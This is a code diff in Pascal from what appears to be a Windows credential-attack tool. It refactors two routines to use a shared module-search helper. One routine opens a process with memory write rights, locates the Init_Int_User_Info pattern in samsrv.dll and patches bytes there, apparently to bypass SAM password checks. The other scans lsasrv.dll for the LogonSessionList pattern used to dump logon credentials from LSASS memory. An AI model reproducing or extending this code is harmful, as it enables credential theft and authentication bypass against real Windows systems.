@@ -376,6 +376,7 @@ const
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
 var
+  module:string='samsrv.dll';
   dummy:string;
   hprocess,hmod:thandle;
   hmods:array[0..1023] of thandle;
@@ -421,37 +422,19 @@ begin
      end;
   log('patch pos:'+inttostr(patch_pos ),0);
   //
+  pattern:=Init_Int_User_Info ;
+  if search_module_mem (pid,module,pattern,offset)=false then
+     begin
+     log('search_module_mem NOT OK');
+     exit;
+     end;
+  //
   hprocess:=thandle(-1);
   hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                         false,pid);
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
-       cbneeded:=0;
-       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
-               begin
-               log('EnumProcessModules OK',0);
-
-               for count:=0 to cbneeded div sizeof(thandle) do
-                   begin
-                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
-                      begin
-                      dummy:=lowercase(strpas(szModName ));
-                      //writeln(dummy); //debug
-                      if pos('samsrv.dll',dummy)>0 then
-                         begin
-                         log('samsrv.dll found:'+inttohex(hMods[count],8),0);
-                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
-                            begin
-                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
-                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
-                            addr:=MODINFO.lpBaseOfDll;
-                            pattern:=Init_Int_User_Info ;
-                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
-                            log('Searching...',0);
-                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
-                            log('Done!',0);
                             if offset<>0 then
                                  begin
                                  log('found:'+inttohex(offset,sizeof(pointer)),0);
@@ -475,8 +458,8 @@ begin
                                         end;
                                         end
                                         else log('patch failed',1);
-                                   end;
-                                 end;
+                                   end; //if ReadMem
+                                 end; //if offset<>0 then
                             {//test - lets read first 4 bytes of our module
                              //can be verified with process hacker
                             if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
@@ -485,12 +468,6 @@ begin
                                log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                                end;
                             }
-                            end;//if GetModuleInformation...
-                         break; //no need to search other modules...
-                         end; //if pos('samsrv.dll',dummy)>0 then
-                      end; //if GetModuleFileNameExA
-                   end; //for count:=0...
-               end; //if EnumProcessModules...
        closehandle(hprocess);
        end;//if openprocess...
 
@@ -514,12 +491,7 @@ PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $
   //after:array[0..1] of byte=($0F,$84);
 var
   module:string='lsasrv.dll';
-  hprocess,hmod:thandle;
-  hmods:array[0..1023] of thandle;
-  MODINFO:  MODULEINFO;
-  cbNeeded,count:	 DWORD;
-  szModName:array[0..254] of char;
-  addr:pointer;
+  hprocess:thandle;
   offset_list:array[0..3] of byte;
   offset_list_dword:dword;
   read:cardinal;
@@ -612,29 +584,6 @@ begin
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
-       cbneeded:=0;
-       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
-               begin
-               log('EnumProcessModules OK',0);
-
-               for count:=0 to cbneeded div sizeof(thandle) do
-                   begin
-                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
-                      begin
-                      //dummy:=lowercase(strpas(szModName ));
-                      if pos(lowercase(module),lowercase(strpas(szModName )))>0 then
-                         begin
-                         log(module+' found:'+inttohex(hMods[count],8),0);
-                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
-                            begin
-                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
-                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
-                            addr:=MODINFO.lpBaseOfDll;
-                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
-                            log('Searching...',0);
-                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
-                            log('Done!',0);
                             if offset<>0 then
                                  begin
                                  log('found:'+inttohex(offset,sizeof(pointer)),0);
@@ -840,7 +789,7 @@ begin
                                    //...
 
                                    end; //if readmem
-                                 end;
+                                 end; //if offset<>0
                             {//test - lets read first 4 bytes of our module
                              //can be verified with process hacker
                             if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
@@ -849,11 +798,6 @@ begin
                                log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                                end;
                             }
-                            end;//if GetModuleInformation...
-                         end; //if pos('samsrv.dll',dummy)>0 then
-                      end; //if GetModuleFileNameExA
-                   end; //for count:=0...
-               end; //if EnumProcessModules...
        closehandle(hprocess);
        end;//if openprocess...
 
